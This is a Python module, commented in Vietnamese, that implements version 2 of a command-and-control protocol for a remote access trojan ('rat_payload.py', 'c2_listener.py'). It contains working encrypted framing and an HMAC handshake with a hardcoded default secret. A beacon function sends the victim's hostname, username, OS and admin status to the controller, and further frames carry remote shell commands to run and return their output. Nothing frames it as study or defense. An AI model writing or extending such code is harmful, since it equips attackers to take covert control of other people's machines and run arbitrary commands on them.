"""C2 protocol v2.

Giao thức chung cho app_server.C2Manager, c2_listener.py và rat_payload.py.

Frame = 4 byte big-endian (độ dài ciphertext) + ciphertext.
Ciphertext = nonce 12 byte + AES-256-GCM(payload).

Handshake giữ nguyên như bản cũ (challenge 32 byte thô, HMAC-SHA256 hex,
server trả về chuỗi "AUTH_OK" đã mã hóa) để agent cũ vẫn bắt tay được.
Sau AUTH_OK, agent v2 gửi ngay một frame JSON {"type": "hello", ...}.
Server trả frame {"type": "hello_ack", "proto": 2}. Nếu agent không nhận
được hello_ack trong thời gian chờ, nó tự chuyển về chế độ legacy
(không framing) để nói chuyện với server cũ.
"""

import hashlib
import hmac
import json
import os
import platform
import socket
import struct
import sys

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PROTO_VERSION = 2
MAX_FRAME = 4 * 1024 * 1024
HEADER = struct.Struct("!I")
DEFAULT_SECRET = b"NguoiDepTraiNhatTheGioi_2026"


def derive_key(secret):
    if isinstance(secret, str):
        secret = secret.encode("utf-8")
    return hashlib.sha256(secret).digest()


def encrypt(key, plaintext):
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    return nonce + aesgcm.encrypt(nonce, plaintext, None)


def decrypt(key, blob):
    if len(blob) < 13:
        raise ValueError("frame quá ngắn")
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(blob[:12], blob[12:], None)


def recv_exact(sock, size):
    chunks = []
    remaining = size
    while remaining > 0:
        chunk = sock.recv(remaining)
        if not chunk:
            return None
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def send_frame(sock, blob):
    sock.sendall(HEADER.pack(len(blob)) + blob)


def recv_frame(sock, max_size=MAX_FRAME):
    header = recv_exact(sock, 4)
    if not header:
        return None
    (length,) = HEADER.unpack(header)
    if length < 13 or length > max_size:
        raise ValueError(f"độ dài frame không hợp lệ: {length}")
    return recv_exact(sock, length)


class FrameStream:
    """Đọc frame qua bộ đệm riêng.

    Khác với recv_frame(), nếu socket timeout giữa lúc đang nhận một frame,
    các byte đã đọc vẫn nằm trong buffer thay vì bị mất → không làm lệch
    stream. Dùng cho reader thread chạy song song với lệnh exec.
    """

    def __init__(self, sock, max_size=MAX_FRAME):
        self.sock = sock
        self.max_size = max_size
        self.buf = bytearray()

    def feed(self):
        """Đọc thêm dữ liệu. False nếu peer đóng kết nối."""
        chunk = self.sock.recv(65536)
        if not chunk:
            return False
        self.buf += chunk
        return True

    def pop_frame(self):
        """Trả về frame hoàn chỉnh tiếp theo, hoặc None nếu chưa đủ."""
        if len(self.buf) < 4:
            return None
        (length,) = HEADER.unpack(bytes(self.buf[:4]))
        if length < 13 or length > self.max_size:
            raise ValueError(f"độ dài frame không hợp lệ: {length}")
        end = 4 + length
        if len(self.buf) < end:
            return None
        blob = bytes(self.buf[4:end])
        del self.buf[:end]
        return blob


def send_json(sock, key, obj):
    send_frame(sock, encrypt(key, json.dumps(obj, ensure_ascii=False).encode("utf-8")))


def recv_json(sock, key, max_size=MAX_FRAME):
    blob = recv_frame(sock, max_size)
    if blob is None:
        return None
    return json.loads(decrypt(key, blob).decode("utf-8", errors="replace"))


def peek_frame_length(sock):
    """Đọc 4 byte header mà không lấy khỏi buffer. None nếu không đủ/không hợp lệ."""
    buf = b""
    while len(buf) < 4:
        try:
            chunk = sock.recv(4 - len(buf), socket.MSG_PEEK)
        except (socket.timeout, BlockingIOError, OSError):
            return None
        if not chunk:
            return None
        buf += chunk
        if len(chunk) == 0:
            break
    if len(buf) < 4:
        return None
    (length,) = HEADER.unpack(buf[:4])
    if length < 13 or length > MAX_FRAME:
        return None
    return length


def is_admin():
    try:
        if sys.platform == "win32":
            import ctypes

            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        return os.geteuid() == 0
    except Exception:
        return False


def collect_hello():
    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"
    try:
        user = os.getlogin()
    except Exception:
        user = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
    return {
        "type": "hello",
        "proto": PROTO_VERSION,
        "hostname": hostname,
        "user": user,
        "os": f"{platform.system()} {platform.release()}",
        "arch": platform.machine(),
        "admin": is_admin(),
        "pid": os.getpid(),
        "version": "2.0",
    }


def handshake_client(sock, secret=DEFAULT_SECRET, timeout=10.0):
    """Trả về (key, framing) với framing True nếu server hỗ trợ protocol v2."""
    key = derive_key(secret)
    secret_bytes = secret.encode("utf-8") if isinstance(secret, str) else secret
    sock.settimeout(timeout)
    challenge = recv_exact(sock, 32)
    if not challenge:
        raise ConnectionError("server đóng kết nối trước challenge")
    response = hmac.new(secret_bytes, challenge, hashlib.sha256).hexdigest()
    sock.sendall(response.encode("utf-8"))

    # Server trả ciphertext thô (không framing) đúng như bản cũ.
    raw = _recv_raw_message(sock)
    if raw is None:
        raise ConnectionError("không nhận được AUTH_OK")
    if decrypt(key, raw).decode("utf-8", errors="replace") != "AUTH_OK":
        raise ConnectionError("xác thực thất bại")

    # Thử bắt tay v2: gửi hello có framing, chờ hello_ack có framing.
    framing = False
    try:
        send_json(sock, key, collect_hello())
        sock.settimeout(3.0)
        ack = recv_json(sock, key)
        framing = isinstance(ack, dict) and ack.get("type") == "hello_ack"
        if not framing:
            raise ValueError("server không trả hello_ack")
    except Exception:
        framing = False
    sock.settimeout(None)
    return key, framing


def _recv_raw_message(sock, max_size=MAX_FRAME):
    """Đọc một ciphertext thô kiểu cũ (không length prefix)."""
    try:
        first = sock.recv(max_size)
    except socket.timeout:
        return None
    if not first:
        return None
    chunks = [first]
    # Gom thêm nếu TCP chia nhỏ; chờ rất ngắn để không treo với server legacy.
    sock.settimeout(0.05)
    try:
        while sum(len(c) for c in chunks) < max_size:
            more = sock.recv(max_size - sum(len(c) for c in chunks))
            if not more:
                break
            chunks.append(more)
    except (socket.timeout, OSError):
        pass
    return b"".join(chunks)


def handshake_server_after_auth(conn, key, secret=DEFAULT_SECRET, timeout=2.0):
    """Server: sau khi đã gửi AUTH_OK, thử nhận hello v2.

    Trả về (framing, metadata). Nếu client là agent cũ (không gửi gì) thì
    framing=False và metadata rỗng.
    """
    meta = {}
    framing = False
    old_timeout = conn.gettimeout()
    conn.settimeout(timeout)
    try:
        length = peek_frame_length(conn)
        if length is not None:
            hello = recv_json(conn, key)
            if isinstance(hello, dict) and hello.get("type") == "hello":
                framing = True
                meta = {
                    "hostname": str(hello.get("hostname") or "unknown")[:120],
                    "user": str(hello.get("user") or "unknown")[:120],
                    "os": str(hello.get("os") or "unknown")[:120],
                    "arch": str(hello.get("arch") or "unknown")[:40],
                    "admin": bool(hello.get("admin")),
                    "pid": hello.get("pid"),
                    "version": str(hello.get("version") or "unknown")[:32],
                }
                send_json(conn, key, {"type": "hello_ack", "proto": PROTO_VERSION})
    except Exception:
        framing = False
        meta = {}
    finally:
        conn.settimeout(old_timeout)
    return framing, meta


def command_frame(key, command, job_id):
    return encrypt(
        key,
        json.dumps(
            {"type": "exec", "id": job_id, "command": command, "timeout": 60},
            ensure_ascii=False,
        ).encode("utf-8"),
    )


def result_frame(key, job_id, exit_code, stdout, stderr, duration):
    return encrypt(
        key,
        json.dumps(
            {
                "type": "result",
                "id": job_id,
                "exit_code": exit_code,
                "stdout": stdout,
                "stderr": stderr,
                "duration": round(duration, 3),
            },
            ensure_ascii=False,
        ).encode("utf-8"),
    )


def hello_frame(key):
    return encrypt(key, json.dumps(collect_hello(), ensure_ascii=False).encode("utf-8"))


def platform_meta():
    return {
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "arch": platform.machine(),
    }
